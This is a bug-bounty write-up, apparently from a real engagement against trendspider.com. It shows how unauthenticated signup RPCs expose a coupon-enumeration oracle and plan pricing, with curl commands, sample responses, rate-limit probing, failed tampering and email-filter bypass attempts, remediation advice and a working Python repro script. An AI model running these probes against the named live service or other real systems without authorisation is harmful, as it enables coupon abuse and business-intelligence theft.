# Unauthenticated signup-RPC oracles — coupon / tax / account-existence

Built on a live SaaS engagement (trendspider.com / charts.trendspider.com, 2026-10).
Modern signup flows are not one endpoint: they are a namespace of small RPCs
(`/authentication/1/registration/<method>`) that the SPA calls in sequence. Those RPCs
are frequently reachable **before** any account exists, and two of them are oracles.

## 1. Discovery — the token map is handed to anonymous visitors

```bash
curl -sk -D - -o /dev/null "https://<app>/register/?plan=<planId>&ncc=1" | grep -i set-cookie
# set-cookie: tokens=eyJ1c2VyLWNyZWF0ZSI6...   (base64 JSON: method -> token)
```

Decode it:

```python
import base64, json
json.loads(base64.b64decode(cookie_value + "=="))
# {'user-create': 'MTgxNDg2...', 'check-coupon': 'MTE0Mzc4...', 'get-tax-rate': '...',
#  'subscription-create': '...', 'abandoned-cart-tracking': '...', ...}
```

On the worked target the map contained 11 methods, including `check-coupon`,
`get-tax-rate`, `user-create`, `subscription-create`,
`check-google-account-can-register`, and four PayPal order/setup token methods.

**Tokens are method-bound.** This is not a bug, it is the anti-CSRF design — and it
tells you the RPCs are meant to be called individually:

```json
// check-coupon token replayed on get-tax-rate:
{"status":"error","type":"session","result":"Internal server error (wrong form token)."}
// no token at all:
{"status":"ok","result":{"taxRate":0,"status":"validation_error","message":"The Token is required"}}
```

So harvest one token per method, use each on its own method, and record that you did —
it pre-empts "you bypassed CSRF" as a rebuttal.

## 2. Oracle A — coupon existence / validity / full commercial terms

```bash
curl -sk -X POST "https://<app>/authentication/1/registration/check-coupon" \
  -H 'Content-Type: application/json' \
  -H 'Origin: https://<app>' -H 'Referer: https://<app>/register/' \
  -d '{"token":"<check-coupon token>","meta":{},"couponCode":"SAVE25","planId":"<planId>"}'
```

Hit:

```json
{"status":"ok","result":{
  "description":"… 25% Off Discount for First year","planOverrides":{"trial_days":null},
  "code":"SAVE25","exists":true,"valid":true,"canUseWithThisPlan":true,"canApply":true,
  "domain":"coupon","duration":"repeating","duration_in_months":12,
  "coupon":"SAVE25","discount":25,"discountType":"percent",
  "couponSHA1":"f4a5a077adc1b55436762d62fd50bded892319e4",
  "title":"25% off your first 12 months"}}
```

Miss:

```json
{"status":"ok","result":{"code":"ZZNOTREAL991","exists":false,"valid":false,
 "canApply":false,"error":"No such coupon: 'ZZNOTREAL991'"}}
```

Three booleans plus the discount block make this a clean, machine-readable oracle:
every probe answers "does this code exist, how much is it worth, does it apply to this
plan". That is the whole finding — enumeration plus terms disclosure, to an
unauthenticated caller.

## 3. Oracle B — plan/pricing metadata

Plan IDs are often base64 in the marketing HTML:

```bash
curl -sk https://trendspider.com/pricing/signup/standard-ind/ | grep -oE 'data-(trial_)?plan_id="[^"]*"'
# Z28yNV9zdGFuZGFyZF90cmlhbF8xbW8=  ->  go25_standard_trial_1mo
```

Then, unauthenticated:

```bash
curl -sk "https://charts.trendspider.com/authentication/1/registration/billing-plans?plans=go25_standard_trial_1mo"
# {"id":"go25_standard_trial_1mo","price":89,"trial":14,
#  "trialOptions":{"paid":true,"price":19}, "metadata":{"app/limitations":"…","max_alerts":10,…}}
```

Reveals price, trial length, trial fee, and the full per-tier feature limit map.

## 4. Rate-limit differential (the part that makes it a finding)

Test each RPC in isolation: 12 sequential probes, 0.4–0.6 s apart, look for `429` and
for latency ramp.

```
1..12  HTTP 200  0.77–1.08 s  {"exists":false,...}      <- no limiter, no lockout
```

Contrast with the login endpoint on the same estate, which returns `429` after exactly
20 attempts with a latency ramp 730 ms → 2200 ms. **A limiter that exists on one auth
endpoint and not its siblings is a gap, not a policy** — say so explicitly.

Also check whether the anti-bot layer actually covers the API host. On this target the
marketing site (`trendspider.com`) sat behind a SiteGround captcha, while the app host
(`charts.trendspider.com`) that serves the registration RPCs did not — the captcha was
theatre for this path.

## 5. What did NOT work (state these, they bound the severity)

- **Price tampering** — sending a modified `plan` object (`price:0`,
  `trialOptions.paid:false`) alongside `price:<planId>` did not change anything:
  `subscription-create` resolves the plan server-side. Do not claim price manipulation
  without a changed charge amount.
- **Skipping payment with `?ncc=1`** — the SPA skips the card UI
  (`noCCRegistration=true`) but the server still rejects with a generic
  `"Something went wrong please contact support"` because the plan carries a paid trial.
- **`user-create` without `subscription-create`** — `"No registration token provided"`.
  The registration token is issued by the subscription step.
- **Disposable-email bypass** — the filter survived uppercase, `+alias`, and a
  trailing-dot variant (`"The Email is not valid email"`), and blocked 22 of 25 temp
  providers tested. The three that passed (no MX / obscure domains) then failed later
  in the flow.

## 6. Severity and reporting judgment

Default **Low (≈5.3)**: no user data, no auth bypass, no price manipulation —
discount/business-intel exposure. Many programs rate this **Informative** ("no
meaningful impact"), so treat it as a slot-spending decision, not a default submission.

Escalate only with evidence of one of:
- a valid code granting a material discount (e.g. 100% off, free month) — quote the
  exact response;
- the oracle returning PII or another user's coupon assignment;
- chaining into `subscription-create` to actually obtain the discounted price.

Frame the report around *what the oracle returns*, not "the endpoint has no rate limit" —
rate limiting is a control gap; the oracle leaking commercial terms is the impact.

## 7. Remediation to recommend

1. Per-IP + per-session rate limit on `/authentication/1/registration/*` with backoff,
   matching the login limiter.
2. Return a single generic `"code not applicable"` for every miss; drop
   `exists` / `valid` / `canApply` / `discount` / `couponSHA1` from unauthenticated
   responses.
3. Rotate or session-bind the per-method form tokens so one cookie cannot drive
   unlimited probes.
4. Put the business-value endpoints (coupon, tax, user-create) behind a server-verified
   challenge, not just the marketing page they hang off.

## 8. Repro skeleton

```python
import json, base64, urllib.request, ssl, http.cookiejar
BASE="https://charts.trendspider.com"; PLAN="go25_standard_trial_1mo"; UA="curl/8.5.0"
ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
cj=http.cookiejar.CookieJar()
op=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj),
                               urllib.request.HTTPSHandler(context=ctx))
op.open(urllib.request.Request(f"{BASE}/register/?plan={PLAN}&ncc=1",
        headers={"User-Agent":UA}), timeout=25)
toks={c.name: c.value for c in cj}
t=json.loads(base64.b64decode(toks["tokens"]+"=="))["check-coupon"]
body={"token":t,"meta":{},"couponCode":"SAVE25","planId":PLAN}
req=urllib.request.Request(f"{BASE}/authentication/1/registration/check-coupon",
    data=json.dumps(body).encode(),
    headers={"User-Agent":UA,"Content-Type":"application/json",
             "Origin":BASE,"Referer":BASE+"/register/"}, method="POST")
print(op.open(req, timeout=20).read().decode())
```
